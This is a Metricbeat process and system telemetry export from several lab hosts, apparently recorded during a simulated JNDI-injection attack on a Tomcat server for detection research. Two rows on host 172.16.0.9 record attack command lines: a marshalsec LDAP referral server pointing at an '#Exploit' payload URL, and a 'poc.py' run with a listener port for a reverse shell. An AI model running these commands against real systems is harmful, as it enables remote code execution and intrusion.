@timestamp,agent.type,event.dataset,host.architecture,host.ip,host.os.kernel,host.os.name,host.os.version,metricset.name,process.args,process.cpu.pct,process.executable,process.memory.pct,process.name,process.working_directory,system.process.cmdline,system.process.cpu.total.norm.pct,system.process.cpu.total.pct,system.process.cpu.total.value,system.process.fd.limit.hard,system.process.fd.limit.soft,system.process.memory.rss.bytes,system.process.memory.rss.pct,system.process.memory.share,system.process.memory.size,user.name
"Oct 24, 2022 @ 22:19:40.681",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/share/metricbeat/bin/metricbeat, -c, /etc/metricbeat/metricbeat.yml, --path.home, /usr/share/metricbeat, --path.config, /etc/metricbeat, --path.data, /var/lib/metricbeat, --path.logs, /var/log/metricbeat",0.1%,/usr/share/metricbeat/bin/metricbeat,0.8%,metricbeat,/,/usr/share/metricbeat/bin/metricbeat -c /etc/metricbeat/metricbeat.yml --path.home /usr/share/metricbeat --path.config /etc/metricbeat --path.data /var/lib/metricbeat --path.logs /var/log/metricbeat,0.1%,0.2%,"12,410","1,048,576","1,048,576",31.2MB,0.8%,4.4MB,1.1GB,root
"Oct 24, 2022 @ 22:19:40.681",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/share/filebeat/bin/filebeat-god, -r, /, -n, -p, /var/run/filebeat.pid, --, /usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat-god,0%,filebeat-god,/,/usr/share/filebeat/bin/filebeat-god -r / -n -p /var/run/filebeat.pid -- /usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,0,"1,048,576","1,048,576",0B,0%,0B,9.1MB,root
"Oct 24, 2022 @ 22:19:40.681",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat,0.8%,filebeat,/,/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,"18,960","1,048,576","1,048,576",32.3MB,0.8%,4.5MB,1.2GB,root
"Oct 24, 2022 @ 22:19:40.681",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,/bin/sh,0%,/bin/dash,0%,sh,/usr/local/tomcat,/bin/sh,0%,0%,0,"1,048,576","1,048,576",504KB,0%,416KB,4.2MB,root
"Oct 24, 2022 @ 22:19:40.625",metricbeat,system.network,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:40.625",metricbeat,system.network,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:40.625",metricbeat,system.network,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:40.623",metricbeat,system.process.summary,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:40.621",metricbeat,system.memory,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),memory,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:40.608",metricbeat,system.load,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),load,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:40.597",metricbeat,system.socket.summary,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),socket_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:40.596",metricbeat,system.cpu,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),cpu,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.283",metricbeat,system.socket.summary,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),socket_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.283",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/metricbeat/bin/metricbeat, -c, /etc/metricbeat/metricbeat.yml, --path.home, /usr/share/metricbeat, --path.config, /etc/metricbeat, --path.data, /var/lib/metricbeat, --path.logs, /var/log/metricbeat",0.4%,/usr/share/metricbeat/bin/metricbeat,0.8%,metricbeat,/,/usr/share/metricbeat/bin/metricbeat -c /etc/metricbeat/metricbeat.yml --path.home /usr/share/metricbeat --path.config /etc/metricbeat --path.data /var/lib/metricbeat --path.logs /var/log/metricbeat,0.4%,0.9%,"11,450","1,048,576","1,048,576",32.3MB,0.8%,5.8MB,1.4GB,root
"Oct 24, 2022 @ 22:19:39.283",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",0.1%,/usr/share/packetbeat/bin/packetbeat,1.3%,packetbeat,/,/usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,0.1%,0.2%,"8,620","1,048,576","1,048,576",51.8MB,1.3%,30.2MB,1.4GB,root
"Oct 24, 2022 @ 22:19:39.283",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/home/jdk1.8.0_20/bin/java, -cp, /home/marshalsec-0.0.3-SNAPSHOT-all.jar, marshalsec.jndi.LDAPRefServer, http://172.16.0.9:8000/#Exploit",0.1%,/home/jdk1.8.0_20/bin/java,1.2%,java,/home,/home/jdk1.8.0_20/bin/java -cp /home/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://172.16.0.9:8000/#Exploit,0.1%,0.1%,"1,520","1,048,576","1,048,576",46.5MB,1.2%,13MB,3.2GB,root
"Oct 24, 2022 @ 22:19:39.283",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/bin/sh, -c, tail -f /dev/null",0%,/usr/bin/dash,0%,sh,/,/bin/sh -c tail -f /dev/null,0%,0%,50,"1,048,576","1,048,576",0B,0%,0B,2.8MB,root
"Oct 24, 2022 @ 22:19:39.283",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat-god, -r, /, -n, -p, /var/run/filebeat.pid, --, /usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat-god,0%,filebeat-god,/,/usr/share/filebeat/bin/filebeat-god -r / -n -p /var/run/filebeat.pid -- /usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,0,"1,048,576","1,048,576",0B,0%,0B,9.1MB,root
"Oct 24, 2022 @ 22:19:39.283",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat,1%,filebeat,/,/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,"19,740","1,048,576","1,048,576",37.4MB,1%,11.3MB,1.5GB,root
"Oct 24, 2022 @ 22:19:39.283",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"python3, /home/poc.py, --userip, 172.16.0.9, --webport, 8000, --lport, 9001",0%,/usr/bin/python3.10,0.2%,python3,/home,python3 /home/poc.py --userip 172.16.0.9 --webport 8000 --lport 9001,0%,0%,200,"1,048,576","1,048,576",8.9MB,0.2%,7.9MB,96.8MB,root
"Oct 24, 2022 @ 22:19:39.261",metricbeat,system.network,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.261",metricbeat,system.network,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.261",metricbeat,system.network,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.259",metricbeat,system.fsstat,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),fsstat,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.258",metricbeat,system.process.summary,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.252",metricbeat,system.load,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),load,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.251",metricbeat,system.cpu,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),cpu,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.250",metricbeat,system.memory,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),memory,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:39.244",metricbeat,system.uptime,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),uptime,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:37.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/metricbeat/bin/metricbeat, -c, /etc/metricbeat/metricbeat.yml, --path.home, /usr/share/metricbeat, --path.config, /etc/metricbeat, --path.data, /var/lib/metricbeat, --path.logs, /var/log/metricbeat",0.2%,/usr/share/metricbeat/bin/metricbeat,0.8%,metricbeat,/,/usr/share/metricbeat/bin/metricbeat -c /etc/metricbeat/metricbeat.yml --path.home /usr/share/metricbeat --path.config /etc/metricbeat --path.data /var/lib/metricbeat --path.logs /var/log/metricbeat,0.2%,0.3%,"13,500","1,048,576","1,048,576",29.8MB,0.8%,4.1MB,1.4GB,root
"Oct 24, 2022 @ 22:19:37.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",0.1%,/usr/share/packetbeat/bin/packetbeat,1.2%,packetbeat,/,/usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,0.1%,0.1%,"4,590","1,048,576","1,048,576",47.2MB,1.2%,27.3MB,1.4GB,root
"Oct 24, 2022 @ 22:19:37.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0.1%,/usr/share/filebeat/bin/filebeat,0.8%,filebeat,/,/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0.1%,0.1%,"19,450","1,048,576","1,048,576",31.2MB,0.8%,6.4MB,1.4GB,root
"Oct 24, 2022 @ 22:19:37.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,/usr/sbin/vsftpd,0%,/usr/sbin/vsftpd,0%,vsftpd,/,/usr/sbin/vsftpd,0%,0%,320,"1,048,576","1,048,576",4KB,0%,0B,9.9MB,root
"Oct 24, 2022 @ 22:19:37.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat-god, -r, /, -n, -p, /var/run/filebeat.pid, --, /usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat-god,0%,filebeat-god,/,/usr/share/filebeat/bin/filebeat-god -r / -n -p /var/run/filebeat.pid -- /usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,0,"1,048,576","1,048,576",0B,0%,0B,9.1MB,root
"Oct 24, 2022 @ 22:19:37.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"tail, -f, /dev/null",0%,/usr/bin/tail,0%,tail,/,tail -f /dev/null,0%,0%,120,"1,048,576","1,048,576",32KB,0%,0B,2.8MB,root
"Oct 24, 2022 @ 22:19:37.138",metricbeat,system.socket.summary,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),socket_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:37.136",metricbeat,system.process.summary,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:37.121",metricbeat,system.network,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:37.121",metricbeat,system.network,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:37.121",metricbeat,system.network,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:37.120",metricbeat,system.memory,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),memory,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:37.116",metricbeat,system.load,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),load,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:37.114",metricbeat,system.cpu,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),cpu,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:35.910",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/metricbeat/bin/metricbeat, -c, /etc/metricbeat/metricbeat.yml, --path.home, /usr/share/metricbeat, --path.config, /etc/metricbeat, --path.data, /var/lib/metricbeat, --path.logs, /var/log/metricbeat",0.2%,/usr/share/metricbeat/bin/metricbeat,0.9%,metricbeat,/,/usr/share/metricbeat/bin/metricbeat -c /etc/metricbeat/metricbeat.yml --path.home /usr/share/metricbeat --path.config /etc/metricbeat --path.data /var/lib/metricbeat --path.logs /var/log/metricbeat,0.2%,0.4%,"8,870","1,048,576","1,048,576",34.3MB,0.9%,3.5MB,1.4GB,root
"Oct 24, 2022 @ 22:19:35.910",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",0.2%,/usr/share/packetbeat/bin/packetbeat,1.2%,packetbeat,/,/usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,0.2%,0.3%,"5,750","1,048,576","1,048,576",47.5MB,1.2%,26.9MB,1.4GB,root
"Oct 24, 2022 @ 22:19:35.910",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/bin/sh, -c, rsyslogd; /usr/sbin/sshd -D",0%,/usr/bin/dash,0%,sh,/,/bin/sh -c rsyslogd; /usr/sbin/sshd -D,0%,0%,40,"1,048,576","1,048,576",0B,0%,0B,2.8MB,root
"Oct 24, 2022 @ 22:19:35.910",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/packetbeat/bin/packetbeat-god, -r, /, -n, -p, /var/run/packetbeat.pid, --, /usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",0%,/usr/share/packetbeat/bin/packetbeat-god,0%,packetbeat-god,/,/usr/share/packetbeat/bin/packetbeat-god -r / -n -p /var/run/packetbeat.pid -- /usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,0%,0%,0,"1,048,576","1,048,576",0B,0%,0B,9.1MB,root
"Oct 24, 2022 @ 22:19:35.910",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat-god, -r, /, -n, -p, /var/run/filebeat.pid, --, /usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat-god,0%,filebeat-god,/,/usr/share/filebeat/bin/filebeat-god -r / -n -p /var/run/filebeat.pid -- /usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,0,"1,048,576","1,048,576",0B,0%,0B,9.1MB,root
"Oct 24, 2022 @ 22:19:35.910",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat,1%,filebeat,/,/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,"17,960","1,048,576","1,048,576",37.6MB,1%,7.9MB,1.4GB,root
"Oct 24, 2022 @ 22:19:35.910",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups,0%,/usr/sbin/sshd,0.1%,sshd,/,sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups,0%,0%,40,"1,048,576","1,048,576",2.1MB,0.1%,2MB,15.1MB,root
"Oct 24, 2022 @ 22:19:35.903",metricbeat,system.network,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:35.903",metricbeat,system.network,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:35.903",metricbeat,system.network,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:35.902",metricbeat,system.socket.summary,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),socket_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:35.900",metricbeat,system.process.summary,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:35.895",metricbeat,system.load,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),load,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:35.894",metricbeat,system.memory,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),memory,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:35.892",metricbeat,system.cpu,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),cpu,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:19:30.683",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",0.4%,/usr/share/packetbeat/bin/packetbeat,1.7%,packetbeat,/,/usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,0.4%,0.7%,"7,880","1,048,576","1,048,576",66.4MB,1.7%,28.8MB,1.2GB,root
"Oct 24, 2022 @ 22:19:30.683",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/share/metricbeat/bin/metricbeat, -c, /etc/metricbeat/metricbeat.yml, --path.home, /usr/share/metricbeat, --path.config, /etc/metricbeat, --path.data, /var/lib/metricbeat, --path.logs, /var/log/metricbeat",0.3%,/usr/share/metricbeat/bin/metricbeat,0.8%,metricbeat,/,/usr/share/metricbeat/bin/metricbeat -c /etc/metricbeat/metricbeat.yml --path.home /usr/share/metricbeat --path.config /etc/metricbeat --path.data /var/lib/metricbeat --path.logs /var/log/metricbeat,0.3%,0.5%,"12,390","1,048,576","1,048,576",31.2MB,0.8%,4.4MB,1.1GB,root
"Oct 24, 2022 @ 22:19:30.683",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java, -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties, -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager, -Djdk.tls.ephemeralDHKeySize=2048, -Djava.endorsed.dirs=/usr/local/tomcat/endorsed, -classpath, /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar, -Dcatalina.base=/usr/local/tomcat, -Dcatalina.home=/usr/local/tomcat, -Djava.io.tmpdir=/usr/local/tomcat/temp, org.apache.catalina.startup.Bootstrap, start",0.2%,/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java,3.9%,java,/usr/local/tomcat,/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.endorsed.dirs=/usr/local/tomcat/endorsed -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start,0.2%,0.4%,"16,580","1,048,576","1,048,576",149.8MB,3.9%,7.7MB,3.4GB,root
